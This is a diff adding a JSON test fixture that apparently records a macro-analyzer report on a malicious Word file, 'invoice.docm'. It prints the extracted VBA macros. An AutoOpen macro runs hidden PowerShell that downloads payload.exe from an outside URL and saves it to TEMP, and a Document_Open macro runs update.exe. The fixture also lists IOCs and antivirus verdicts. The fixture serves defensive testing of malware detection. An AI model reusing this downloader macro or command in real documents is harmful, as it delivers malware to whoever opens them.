@@ -1,0 +1,61 @@
+{
+  "_note": "Redacted fixture of POST {MACRO_ANALYZER_URL}/analyze (olevba + optional VirusTotal). Derived from the recorded example report for a macro-bearing .docm.",
+  "success": true,
+  "filename": "invoice.docm",
+  "file_type": "OpenXML",
+  "has_macros": true,
+  "macro_count": 2,
+  "risk_level": "malicious",
+  "flags": {
+    "auto_exec": true,
+    "has_ioc": true,
+    "obfuscated": false,
+    "suspicious": true
+  },
+  "indicators": {
+    "AutoExec": [
+      {"keyword": "AutoOpen", "description": "Runs when the Word document is opened"}
+    ],
+    "Suspicious": [
+      {"keyword": "powershell", "description": "May run PowerShell commands"},
+      {"keyword": "command", "description": "May run commands"}
+    ],
+    "IOC": [
+      {"keyword": "http://recongraph.xyz/payload.exe", "description": "URL found in macro"},
+      {"keyword": "payload.exe", "description": "Executable file name found in macro"},
+      {"keyword": "update.exe", "description": "Executable file name found in macro"}
+    ]
+  },
+  "iocs": [
+    {"type": "url", "value": "http://recongraph.xyz/payload.exe"},
+    {"type": "filename", "value": "payload.exe"},
+    {"type": "filename", "value": "update.exe"}
+  ],
+  "macros": [
+    {
+      "module": "Module1",
+      "stream": "Macros/Module1",
+      "code": "Sub AutoOpen()\n    Dim cmd As String\n    cmd = \"powershell -w hidden -c iwr http://recongraph.xyz/payload.exe -OutFile \" & Environ(\"TEMP\") & \"\\payload.exe\"\n    Shell cmd, vbHide\nEnd Sub\n"
+    },
+    {
+      "module": "Module2",
+      "stream": "Macros/Module2",
+      "code": "Sub Document_Open()\n    CreateObject(\"WScript.Shell\").Run \"update.exe\"\nEnd Sub\n"
+    }
+  ],
+  "xlm_macros": null,
+  "vt": {
+    "success": true,
+    "stats": {
+      "harmless": 58,
+      "malicious": 5,
+      "suspicious": 1,
+      "undetected": 12
+    },
+    "results": {
+      "Kaspersky": {"category": "malicious", "result": "HEUR:Trojan-Downloader.Script.Generic"},
+      "Microsoft": {"category": "malicious", "result": "TrojanDownloader:O97M/Donoff"},
+      "ESET-NOD32": {"category": "suspicious", "result": "VBA/TrojanDownloader.Agent"}
+    }
+  }
+}
